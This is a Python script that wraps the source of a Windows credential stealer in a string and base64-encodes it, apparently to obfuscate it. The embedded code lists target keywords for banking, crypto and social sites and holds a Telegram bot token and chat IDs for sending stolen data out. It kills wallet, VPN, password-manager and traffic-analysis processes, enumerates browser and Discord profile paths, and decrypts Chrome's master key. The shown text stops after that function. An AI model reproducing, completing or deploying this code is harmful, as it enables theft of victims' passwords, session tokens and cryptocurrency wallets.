import base64
data = "import os, json, base64, sqlite3, shutil, requests, glob, re, zipfile, io, datetime, hmac, subprocess, time
from base64 import b64decode
from hashlib import sha1, pbkdf2_hmac
from pathlib import Path
from pyasn1.codec.der.decoder import decode
from Crypto.Cipher import AES, DES3
from win32crypt import CryptUnprotectData
from ctypes import windll, byref, create_unicode_buffer, pointer, WINFUNCTYPE
from ctypes.wintypes import DWORD, WCHAR, UINT

ImportantKeywords = [
    'paypal', 'perfectmoney', 'etsy', 'facebook', 'ebay', 'coin', 'binance', 
    'wallet', 'payment', 'amazon', 'crypto', 'business', 'server', 'instagram', 
    'rdp', 'blockchain', 'vpn', 'google', 'roblox', 'host', 'cloud', 'houbi', 
    'hbo', 'spotfiy', 'twitch', 'steam', 'reddit', 'twitter', 'instagram', 
    'prime', 'subgiare', 'netflix', 'garena', 'riotgames', 'clone', 'via', 
    'nguyenlieu', 'otp', 'sim', 'smit', 'proxy', 'mail', 'traodoisub', 
    'tuongtaccheo', 'bysun', 'mmo', 'tool', 'bm', 'tkqc', 'tainguyen', 'thesieure', 
    'sms', 'captcha', 'bank', 'money', 'hosting', 'tenten', 'domain', 'linkedin', 
    'tiktok', 'snapchat', 'pinterest', 'venmo', 'skrill', 'payoneer', 
    'westernunion', 'cashapp', 'zelle', 'bitcoin', 'ethereum', 'dongvan'
]

LocalAppData = os.getenv("LOCALAPPDATA")
AppData = os.getenv("APPDATA")
TMP = os.getenv("TEMP")
USR = TMP.split("\\AppData")[0]
PathBrowser = f"{TMP}\\Browsers Data"
TOKEN_BOT = "7715447485:AAG3m27HFw5JHUoeikTzzfF6qRtUbstw6JQ"
CHAT_ID_NEW = "-4531702266"
CHAT_ID_RESET = "-4574678611"
CHAT_ID_EXT = "-4594523442"

process_names = [
    "ArmoryQt.exe", "Atomic Wallet.exe", "bytecoin-gui.exe", "Coinomi.exe", 
    "Element.exe", "Exodus.exe", "Guarda.exe", "KeePassXC.exe", "NordVPN.exe", 
    "OpenVPNConnect.exe", "seamonkey.exe", "Signal.exe", "filezilla.exe", 
    "filezilla-server-gui.exe", "keepassxc-proxy.exe", "nordvpn-service.exe", 
    "steam.exe", "walletd.exe", "waterfox.exe", "Discord.exe", "DiscordCanary.exe", 
    "burp.exe", "Ethereal.exe", "EtherApe.exe", "fiddler.exe", "HTTPDebuggerSvc.exe", 
    "HTTPDebuggerUI.exe", "snpa.exe", "solarwinds.exe", "tcpdump.exe", "telerik.exe", 
    "wireshark.exe", "winpcap.exe", "telegram.exe"
]

for process_name in process_names:
    try:
        subprocess.run(["taskkill", "/F", "/IM", process_name], creationflags=0x08000000)
    except:
        continue

creation_datetime = datetime.datetime.now().strftime('%d-%m-%Y (%H:%M:%S)')
categories_order = [
    "Desktop Wallets", "Browser Wallets", "VPN Extensions", "Messengers", 
    "VPN Clients", "Gaming", "Password Managers", "FTP Clients"
]

ch_dc_browsers = {
    "Chromium": f"{LocalAppData}\\Chromium\\User Data",
    "Thorium": f"{LocalAppData}\\Thorium\\User Data",
    "Chrome": f"{LocalAppData}\\Google\\Chrome\\User Data",
    "Chrome (x86)": f"{LocalAppData}\\Google(x86)\\Chrome\\User Data",
    "Chrome SxS": f"{LocalAppData}\\Google\\Chrome SxS\\User Data",
    "Maple": f"{LocalAppData}\\MapleStudio\\ChromePlus\\User Data",
    "Iridium": f"{LocalAppData}\\Iridium\\User Data",
    "7Star": f"{LocalAppData}\\7Star\\7Star\\User Data",
    "CentBrowser": f"{LocalAppData}\\CentBrowser\\User Data",
    "Chedot": f"{LocalAppData}\\Chedot\\User Data",
    "Vivaldi": f"{LocalAppData}\\Vivaldi\\User Data",
    "Kometa": f"{LocalAppData}\\Kometa\\User Data",
    "Elements": f"{LocalAppData}\\Elements Browser\\User Data",
    "Epic Privacy Browser": f"{LocalAppData}\\Epic Privacy Browser\\User Data",
    "Uran": f"{LocalAppData}\\uCozMedia\\Uran\\User Data",
    "Fenrir": f"{LocalAppData}\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer",
    "Catalina": f"{LocalAppData}\\CatalinaGroup\\Citrio\\User Data",
    "Coowon": f"{LocalAppData}\\Coowon\\Coowon\\User Data",
    "Liebao": f"{LocalAppData}\\liebao\\User Data",
    "QIP Surf": f"{LocalAppData}\\QIP Surf\\User Data",
    "Orbitum": f"{LocalAppData}\\Orbitum\\User Data",
    "Dragon": f"{LocalAppData}\\Comodo\\Dragon\\User Data",
    "360Browser": f"{LocalAppData}\\360Browser\\Browser\\User Data",
    "Maxthon": f"{LocalAppData}\\Maxthon3\\User Data",
    "K-Melon": f"{LocalAppData}\\K-Melon\\User Data",
    "CocCoc": f"{LocalAppData}\\CocCoc\\Browser\\User Data",
    "Brave": f"{LocalAppData}\\BraveSoftware\\Brave-Browser\\User Data",
    "Amigo": f"{LocalAppData}\\Amigo\\User Data",
    "Torch": f"{LocalAppData}\\Torch\\User Data",
    "Sputnik": f"{LocalAppData}\\Sputnik\\Sputnik\\User Data",
    "Edge": f"{LocalAppData}\\Microsoft\\Edge\\User Data",
    "DCBrowser": f"{LocalAppData}\\DCBrowser\\User Data",
    "Yandex": f"{LocalAppData}\\Yandex\\YandexBrowser\\User Data",
    "UR Browser": f"{LocalAppData}\\UR Browser\\User Data",
    "Slimjet": f"{LocalAppData}\\Slimjet\\User Data",
    "Opera": f"{AppData}\\Opera Software\\Opera Stable",
    "OperaGX": f"{AppData}\\Opera Software\\Opera GX Stable",
    "Speed360": f"{AppData}\\Local\\360chrome\\Chrome\\User Data",
    "QQBrowser": f"{AppData}\\Local\\Tencent\\QQBrowser\\User Data",
    "Sogou": f"{AppData}\\SogouExplorer\\Webkit",
    "Discord": f'{AppData}\\discord',
    "Discord Canary": f'{AppData}\\discordcanary',
    "Lightcord": f'{AppData}\\Lightcord',
    "Discord PTB": f'{AppData}\\discordptb'
}

def installed_ch_dc_browsers():
    results = []
    for browser, path in ch_dc_browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results

def get_ch_master_key(path):
    try:
        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
            c = f.read()
    except FileNotFoundError:
        return None
    if 'os_crypt' not in c:
        return None
    try:
        local_state = json.loads(c)
        ch_master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        ch_master_key = ch_master_key[5:]
        ch_master_key = CryptUnprotectData(ch_master_key, None, None, None, 0)[1]
        return ch_master_key
    except:
        return None
"
encoded_data = base64.b64encode(data.encode('utf-8'))
print(encoded_data.decode('utf-8'))
